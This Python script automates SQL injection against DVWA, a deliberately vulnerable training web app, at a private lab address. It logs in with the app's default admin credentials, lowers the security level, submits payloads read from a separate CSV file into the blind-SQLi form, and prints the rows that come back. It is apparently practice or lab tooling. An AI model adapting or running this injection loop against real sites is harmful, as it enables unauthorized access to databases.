# -*- coding: utf-8 -*-

import csv
import logging
import os
import sys
import time
from bs4 import BeautifulSoup
import requests
import mechanize
from colorama import Fore, Style

RHOST = "192.168.0.7"
SECLEVEL = ["low"] #low, medium, high

class SQLinjector:
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        # self.br.set_debug_http(True)
        # br.set_debug_redirects(True)
        # br.set_debug_responses(True)

    def login(self):
        try:
            req = requests.get('http://' + RHOST + '/login.php', verify=False, timeout=(3.05, 27))
            if req.status_code == 200:
                self.br.open("http://" + RHOST)
            else:
                self.br.open("http://" + RHOST + "/dvwa")
            self.br.select_form(nr=0)

            self.br.form['username'] = 'admin'
            self.br.form['password'] = 'password'
            self.br.submit()

            self.br.follow_link(url_regex=r'security.php')
            self.br.select_form(nr=0)
            self.br.form['security'] = SECLEVEL
            res = self.br.submit()
            content = res.read()
            self.soup = BeautifulSoup(content, 'html.parser')

            get_seclevel = self.soup.find("em")
            seclevel = str(get_seclevel).split("<em>")[1].replace("</em>", "")
            def show_secevel():
                if seclevel == 'high':
                    print("- Security Level:",Fore.LIGHTRED_EX, Style.BRIGHT, seclevel , Style.RESET_ALL)
                elif seclevel == 'medium':
                    print("- Security Level:",Fore.YELLOW, Style.BRIGHT, seclevel, Style.RESET_ALL)
                elif seclevel == 'low':
                    print("- Security Level:",Fore.LIGHTGREEN_EX, Style.BRIGHT, seclevel, Style.RESET_ALL)
                else:
                    print("")


            print("-" * 55)
            print("- " + self.br.title())
            show_secevel()
            print("-" * 55 )

        except Exception as e:
            logger.error(e)
            print(e)


    def sqlinject(self):
        try:
            with open('input_files/sqli.csv') as csvfile :
                readCSV = csv.reader(csvfile, delimiter=',')
                for row in readCSV :
                    self.br.follow_link(url_regex=r'sqli_blind')
                    self.br.select_form(nr=0)

                    self.br.form['id'] = row[2]


                    res = self.br.submit()
                    content = res.read()
                    soup = BeautifulSoup(content, "lxml")
                    #print(soup)
                    err = soup.html.body.pre

                    if err == "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1":
                        pass
                        #print("WRONG PARAMETER", row[1])
                    elif err == None:
                        pass
                        #print("WRONG PARAMETER", row[1])
                    else:
                        try :
                            allPre = soup.find_all("pre")
                            for pre in allPre :
                                # print(pre)
                                print(str(pre).split("<br/>")[0].replace("<pre>", "").replace("</pre>", ""))
                                print(str(pre).split("<br/>")[1].replace("<pre>", "").replace("</pre>", ""))
                                print(str(pre).split("<br/>")[2].replace("<pre>", "").replace("</pre>", ""))
                                print("-" * 55)
                                time.sleep(2)

                        except IndexError as e :
                            logging.critical(e, exc_info=True)

        except IndexError as e:
            logging.critical(e, exc_info=True)
        except Exception as e:
            logging.critical(e, exc_info=True)
        else:
            pass
        finally:
            pass

if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(filename='logs/sqlinjection.log', level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(name)s %(message)s')
logger = logging.getLogger(__name__)

def main():
    automate = SQLinjector()
    automate.login()
    automate.sqlinject()


if __name__ == '__main__':
    main()
